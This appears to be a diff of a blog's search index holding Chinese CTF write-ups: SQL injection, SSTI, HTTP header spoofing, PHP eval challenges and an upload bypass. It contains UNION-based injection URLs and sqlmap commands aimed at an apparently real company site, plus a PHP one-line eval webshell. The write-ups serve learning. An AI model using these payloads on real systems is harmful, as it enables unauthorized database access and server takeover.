src="https://img-blog.csdnimg.cn/20190714100110978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个表太多了，没法全部显示，我们只需要查看源码即可，表在‘3’的前面<br><img src="https://img-blog.csdnimg.cn/20190714100215631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
-<li>法二、sqlmap<br>可以抓包，salmap扫描包，也可以直接扫描网站，都可以，这里我就扫描网站吧，懒得抓包，存txt了<br>暴数据库<code>sqlmap.py -u www.kabelindo.co.id/readnews.php?id=28 --dbs</code></li>
-<li>-dbs（两个-） –&gt;查询当前数据库<br>得到数据库<code>u9897uwx_kabel</code><br><img src="https://img-blog.csdnimg.cn/20190714094932850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴表名<code>sqlmap.py -u www.kabelindo.co.id/readnews.php?id=28 -D u9897uwx_kabel --tables</code></li>
-<li>D –&gt;指定数据库</li>
-<li>-tables（两个-） –&gt;查询当前数据库的表名<br>得到最后一个表名<code>tbnomax</code><br><img src="https://img-blog.csdnimg.cn/20190714095143856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1>flag{tbnomax}</li>
-</ul>
-<hr>
-<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-速度要快 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<hr>
+    <url>/2019/1RE8ZEW/</url>
+    <content><![CDATA[<blockquote>
 <p>脚本能力+0.001<br>POST快速反弹<br>另：<a href="https://blog.csdn.net/weixin_43578492/article/details/101701339">bugku 秋名山车神</a></p>
+</blockquote>
+<a id="more"></a>
 <hr>
 <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="http://123.206.87.240:8002/web6/">题目</a><br><img src="https://img-blog.csdnimg.cn/20190929175744255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <hr>
@@ -483,19 +543,40 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web进阶-实战2-注入 writeup</title>
+    <url>/2019/XA91Y3/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><ul>
+<li>解题传送门：<a href="http://www.kabelindo.co.id/">http://www.kabelindo.co.id/</a><br><img src="https://img-blog.csdnimg.cn/20190714094244224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><a id="more"></a>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><img src="https://img-blog.csdnimg.cn/20190714094229131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接后得到个这个页面，注入，，，我一开始在搜索框内随意试试，发现没什么用，抓包也没啥结果。然后就逛逛这个网站看看哪里有注入点，找了一会，在页面的About-News里面发现数字型注入，话不多说，开始<br><img src="https://img-blog.csdnimg.cn/20190714094623612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入嘛，老套路，两种方法</li>
+<li>法一、手工注入<br>猜字段<code>http://www.kabelindo.co.id/readnews.php?id=28 order by 5</code>正常<br><img src="https://img-blog.csdnimg.cn/20190714095412605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>http://www.kabelindo.co.id/readnews.php?id=28 order by 6</code><br>报错，字段为5<br><img src="https://img-blog.csdnimg.cn/20190714095450115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看字段回显(记得把id置为无用数值，不然会掩盖后面的查询结果)<br><code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,2,3,4,5</code><br><img src="https://img-blog.csdnimg.cn/20190714095700547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴数据库<code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,database(),3,4,5</code><br>得到数据库<code>u9897uwx_kabel</code><br><img src="https://img-blog.csdnimg.cn/20190714095853519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴表名<code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()</code><br><img src="https://img-blog.csdnimg.cn/20190714100110978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个表太多了，没法全部显示，我们只需要查看源码即可，表在‘3’的前面<br><img src="https://img-blog.csdnimg.cn/20190714100215631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>法二、sqlmap<br>可以抓包，salmap扫描包，也可以直接扫描网站，都可以，这里我就扫描网站吧，懒得抓包，存txt了<br>暴数据库<code>sqlmap.py -u www.kabelindo.co.id/readnews.php?id=28 --dbs</code></li>
+<li>-dbs（两个-） –&gt;查询当前数据库<br>得到数据库<code>u9897uwx_kabel</code><br><img src="https://img-blog.csdnimg.cn/20190714094932850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴表名<code>sqlmap.py -u www.kabelindo.co.id/readnews.php?id=28 -D u9897uwx_kabel --tables</code></li>
+<li>D –&gt;指定数据库</li>
+<li>-tables（两个-） –&gt;查询当前数据库的表名<br>得到最后一个表名<code>tbnomax</code><br><img src="https://img-blog.csdnimg.cn/20190714095143856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1>flag{tbnomax}</li>
+</ul>
+<hr>
+<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>buuoj BJDCTF-2nd WP</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<blockquote>
-<p>复现地址：buuoj.cn</p>
+    <url>/2020/GD3NE8/</url>
+    <content><![CDATA[<blockquote>
+<p>复现地址：buuoj.cn<br>ssti的简单使用</p>
 </blockquote>
-<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><blockquote>
-<p>ssti的简单使用</p>
-</blockquote>
-<p>打开复现地址是一个Google页面<br><img src="https://img-blog.csdnimg.cn/20200611075142860.png" alt="在这里插入图片描述"><br>随便搜索一下看了源码提示ssti</p>
+<a id="more"></a>
+<hr>
+<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><p>打开复现地址是一个Google页面<br><img src="https://img-blog.csdnimg.cn/20200611075142860.png" alt="在这里插入图片描述"><br>随便搜索一下看了源码提示ssti</p>
 <blockquote>
 <p>SSTI又叫服务端模板注入攻击<br>推荐先知师傅的一篇入门教程：<a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
 </blockquote>
@@ -511,7 +592,7 @@
 <h1 id="BJDCTF-2nd-假猪套天下第"><a href="#BJDCTF-2nd-假猪套天下第" class="headerlink" title="[BJDCTF 2nd]假猪套天下第"></a>[BJDCTF 2nd]假猪套天下第</h1><blockquote>
 <p>HTTP Header基础知识考察<br>这道题是Y1ng大师傅出的题，考的很基础<br>Y1ng师傅出题笔记：<a href="https://www.gem-love.com/ctf/2056.html#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80">https://www.gem-love.com/ctf/2056.html#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80</a><br>Y1ng推荐的HTTP Header 详解：<a href="https://www.cnblogs.com/jxl1996/p/10245958.html">https://www.cnblogs.com/jxl1996/p/10245958.html</a></p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200611084438687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin弱口令登陆发现，但是用其他的账户随便输都能进去，进去后啥也没有，抓包看看<br><img src="https://img-blog.csdnimg.cn/20200611084653455.png" alt="在这里插入图片描述"><br>302跳转！，进去注释给的页面<br><img src="https://img-blog.csdnimg.cn/20200611085307456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200611085415184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没发现啥有用的，在抓包看看，cookie里面有个time参数，根据页面提示把他改到99年以后，又说我们不是来自本地的用户<br><img src="https://img-blog.csdnimg.cn/20200611085605328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用xff修改后（X-Forwarded-For:127.0.0.1直接加到repeater最下面就好），说我Too young too simple，那就换种方式，用Client-IP或者X-Real-IP；<br>然后提示访问要来自gem-love.com，用Referer:gem-love.com;<br>接着提示我们的浏览器不是Commodo 64，至于Commodo 64是什么自行搜索，然后用Commodore 64把UA头改了就行；<br>然后说邮箱不对，加上From:<a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#103;&#101;&#109;&#45;&#108;&#111;&#x76;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#x72;&#111;&#x6f;&#116;&#x40;&#103;&#101;&#109;&#45;&#108;&#111;&#x76;&#x65;&#46;&#x63;&#x6f;&#x6d;</a>;<br>最后提示代理服务器需要是y1ng.vip，或者你可以py100一月hhh，加上via:y1ng.vip;<br>大功告成，解一下base64就好了<br><img src="https://img-blog.csdnimg.cn/20200611091429240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200611084438687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin弱口令登陆发现，但是用其他的账户随便输都能进去，进去后啥也没有，抓包看看<br><img src="https://img-blog.csdnimg.cn/20200611084653455.png" alt="在这里插入图片描述"><br>302跳转！，进去注释给的页面<br><img src="https://img-blog.csdnimg.cn/20200611085307456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200611085415184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没发现啥有用的，在抓包看看，cookie里面有个time参数，根据页面提示把他改到99年以后，又说我们不是来自本地的用户<br><img src="https://img-blog.csdnimg.cn/20200611085605328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用xff修改后（X-Forwarded-For:127.0.0.1直接加到repeater最下面就好），说我Too young too simple，那就换种方式，用Client-IP或者X-Real-IP；<br>然后提示访问要来自gem-love.com，用Referer:gem-love.com;<br>接着提示我们的浏览器不是Commodo 64，至于Commodo 64是什么自行搜索，然后用Commodore 64把UA头改了就行；<br>然后说邮箱不对，加上From:<a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#103;&#x65;&#109;&#45;&#108;&#111;&#x76;&#x65;&#x2e;&#99;&#x6f;&#109;">&#114;&#x6f;&#x6f;&#116;&#x40;&#103;&#x65;&#109;&#45;&#108;&#111;&#x76;&#x65;&#x2e;&#99;&#x6f;&#109;</a>;<br>最后提示代理服务器需要是y1ng.vip，或者你可以py100一月hhh，加上via:y1ng.vip;<br>大功告成，解一下base64就好了<br><img src="https://img-blog.csdnimg.cn/20200611091429240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <hr>
 <p>持续更新</p>
 ]]></content>
@@ -519,18 +600,24 @@
         <category>CTF做题记录</category>
       </categories>
       <tags>
-        <tag>安全 信息安全</tag>
+        <tag>CTF WEB</tag>
       </tags>
   </entry>
   <entry>
     <title>buuoj [网鼎杯 2020 青龙组] （持续更新）</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<blockquote>
+    <url>/2020/1Q4RCR8/</url>
+    <content><![CDATA[<blockquote>
 <p>复现地址：<a href="https://buuoj.cn/">https://buuoj.cn/</a><br>拖了这么久才看网鼎杯。。这就是菜的原因吧<br>20-9-22 -&gt; 20-</p>
 </blockquote>
-<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<!-- TOC -->
+
+<ul>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<hr>
 <h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><blockquote>
 <p>知识点：代码审计，反序列化</p>
 </blockquote>
@@ -556,19 +643,21 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>联系方式|会下雪的晴天</title>
-    <url>/2020/undefined/</url>
+    <url>/2020/3KEV53Z/</url>
     <content><![CDATA[<p>Hi~ o(￣▽￣)ブ很高兴以这种方式认识你<br>想必我是遇上了志同道合的你，期待与你的交流，也期待与你做朋友<br>加我请备注 会下雪的晴天’blog</p>
 <h1 id="QQ：-1578422748"><a href="#QQ：-1578422748" class="headerlink" title="QQ： 1578422748"></a>QQ： 1578422748</h1>]]></content>
   </entry>
   <entry>
     <title>“百度杯”CTF比赛 2017 二月场--web 爆破-1 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190613134554606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <url>/2019/1SN7PG3/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190613134554606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>创建赛题，点击链接得到一段源码：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//REQUEST可以接收来自GET或者POST的数据</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w*$/&#x27;</span>,$a ))&#123;<span class="comment">//preg_match 函数用于执行一个正则表达式匹配,返回 pattern 的匹配次数</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);<span class="comment">// var_dump() 函数返回变量的数据类型和值</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>这个代码的作用是如果匹配正则表达式<code>/^\w*$/</code>，就打印变量<code>$$a</code><br><code>$a</code>是hello，<code>$$a</code>是六位变量<code>$hello</code>；<br>由于<code>$a</code>在函数内，要想访问<code>$hello</code>,则需要将其改为超全局变量GLOBALS；<br>即，在URL后面加?hello=GLOBALS;<br>输出语句变为</p>
@@ -578,13 +667,15 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>“百度杯”CTF比赛 2017 二月场--web 爆破-2 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/2019061415042264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <url>/2019/15DXSP6/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/2019061415042264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>点击链接得到以下代码：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 
@@ -601,13 +692,15 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>“百度杯”CTF比赛 2017 二月场--web 爆破-3 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p><img src="https://img-blog.csdnimg.cn/2019061415262960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <url>/2019/1ETBWM5/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p><img src="https://img-blog.csdnimg.cn/2019061415262960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>进入链接后得到</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;time&#x27;</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">$str_rand = range(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;whoami&#x27;</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;whoami&#x27;</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -620,14 +713,18 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload?-WP</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
+    <url>/2019/21BA9MC/</url>
+    <content><![CDATA[<blockquote>
+<p>上传绕过，菜刀连接数据库</p>
+</blockquote>
+<a id="more"></a>
 <hr>
-<h6 id="上传绕过，菜刀连接数据库"><a href="#上传绕过，菜刀连接数据库" class="headerlink" title="上传绕过，菜刀连接数据库"></a>上传绕过，菜刀连接数据库</h6><hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190717173136385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p><img src="https://img-blog.csdnimg.cn/20190717173200288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>写的明明白白，图片上传，用txt写个一句话再把后缀改成jpg即可,一句话:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;caidao&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -640,15 +737,18 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BUUOJ   极客大挑战 2019套餐</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<blockquote>
+    <url>/2020/3F518AW/</url>
+    <content><![CDATA[<blockquote>
 <p>仅为做题思路，记下笔记，如有错误烦请斧正</p>
 </blockquote>
+<a id="more"></a>
+<hr>
